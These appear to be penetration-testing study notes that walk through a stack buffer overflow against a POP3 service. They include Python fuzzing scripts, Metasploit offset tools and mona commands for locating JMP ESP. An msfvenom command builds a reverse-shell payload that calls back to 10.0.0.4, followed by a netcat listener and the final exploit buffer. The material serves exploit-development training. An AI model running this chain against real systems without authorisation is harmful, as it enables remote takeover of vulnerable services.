Buffer Overflow 

Fuzzing

Info: Send malformed data into application input and watch for unexpected crashes. 

Python-Script to connect to a port and send data

#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
try:
	•	print "\nSending evil buffer..." 
	•	s.connect(('10.0.0.22',110)) # connect to IP, POP3 port 
	•	data = s.recv(1024) # receive banner
	•	print data # print banner
	•	s.send('USER test' +'\r\n') # send username "test" 
	•	data = s.recv(1024) # receive reply
	•	print data # print reply
	•	s.send('PASS test\r\n') # send password "test" 
	•	data = s.recv(1024)   # receive reply
	•	print data # print reply
	•	s.close() # close socket
	•	print "\nDone!"
except:
print "Could not connect to POP3!”


Python-Scipt to Fuzz by sending increasing sizes of data

#!/usr/bin/python 
import socket

# Create an array of buffers, from 1 to 5900, with increments of 200. 
buffer=["A"]
counter=100
while len(buffer) <= 30:
	•	buffer.append("A"*counter) 
	•	counter=counter+200

for string in buffer:
	•	print "Fuzzing PASS with %s bytes" % len(string) 
	•	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	•	connect=s.connect(('10.0.0.22',110))
	•	s.recv(1024)
	•	s.send('USER test\r\n')
	•	s.recv(1024)
	•	s.send('PASS ' + string + '\r\n') 
	•	s.send('QUIT\r\n')
	•	s.close()


Python-Scipt to Fuzz by sending one buffer

#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
buffer = 'A' * 2700
try:
	•	print "\nSending evil buffer..." 
	•	s.connect(('10.0.0.22',110)) 
	•	data = s.recv(1024)
	•	s.send('USER username' +'\r\n') 
	•	data = s.recv(1024)
	•	s.send('PASS ' + buffer + '\r\n')
	•	print "\nDone!." 
except:
print "Could not connect to POP3!"


Note: For Windows attach the program to immunity Debugger
Note: For Linux next steps attach the program to  (Evans Debugger)

root@kali:~# edb --run /usr/games/crossfire/bin/crossfire

Hint: EDB Debugger pauses application at start, so hit run twice to allow the program to execute.

Control EIP

Info: The Execution Instruction Pointer (EIP) register contains the next instruction to be executed

Locate the EIP by sending a unique string:

root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700

root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438

Note: 39694438 = EIP value at crash.
Note: Execution Stack Pointer (ESP) value at crash


Locate space for Shellcode

Info: Standard shell reverse payload required 350-400 bytes. 

Increase buffer size to see how much data can be sent with the crash still occuring in the same manner. 
Inspect where the ESP points to by following in dump. 
Locate the space where a payload will fit. 

Check for Bad Characters

Info: Some applications may have bad characters that should not be sent in the buffer. 

Send all the possible hex values in the buffer:


badchars = ( 
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" 
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" 
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" 
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" 
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" 
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" 
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" 
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

Inspect the memory dump for ESP register and see which values do not show up. 
Remove these values from the badchars and send again. 
Repeat till the memory dump for the ESP register contains all the badchars sent. 


Redirect Execution Flow

Info: Using the EIP, we need to redirect the execution flow to the ESP register where the payload is stored. Can't hardcode the ESP register value as this changes on each run.

Find a return address: 

Find a reliable address in memory that contains the JMP ESP instruction. 
Use mona.py module to find a module that:
	•	1) has no memory protections such as DEP or ASLR (If DEP is enabled then the JMP ESP instruction would have to be located in a segment with Read (R) and Executable (E) permissions.
	•	2) has a memory range that does not contain bad characters

Run: !mona modules //Note: This is done using the input bar at the bottom of the immunity debugger mian window. 

Identify the module in the list that satisfies the criteria above. 

Find the opcode equivalent to JMP ESP

root@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > jmp esp
00000000 FFE4 jmp esp

Find a JMP ESP instruction within the module. 

!mona find -s "\xff\xe4" -m <module name>

Note: Choose the address that contains no bad characters. 

Change the Buffer to include the JMP ESP command address:

Remember x86 architecture stores addresses in little endian format and therefore the return address has to be written the "wrong way round"


Generate Shellcode with metasploit

root@kali:~# msfvenom -l payloads

root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"

Note:
	◦	LHOST = ip address of where the reverse shell will connect to
	◦	LPORT = Port of where the reverse shell will connect to
	◦	-f = format of code. Value c = the code will be formatted in C
	◦	-e = set encoder. value x86/shikata_ga_nai = encoder method
	◦	-b = bad characters to omit from the payload
	◦	EXITFUNC = setting the method that the shelllcode will take on exit. If a program is threaded then this value can be set to thread to avoid killing the whole service and thereby crashing it. 

Alter the buffer to include the filler, return address, NOPs (an instruction to just pass onto the next instruction) and the shellcode 

buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

Set up the listener

root@kali:~# nc -nlvp 443


Send the exploit

root@kali:~# python exploit.py










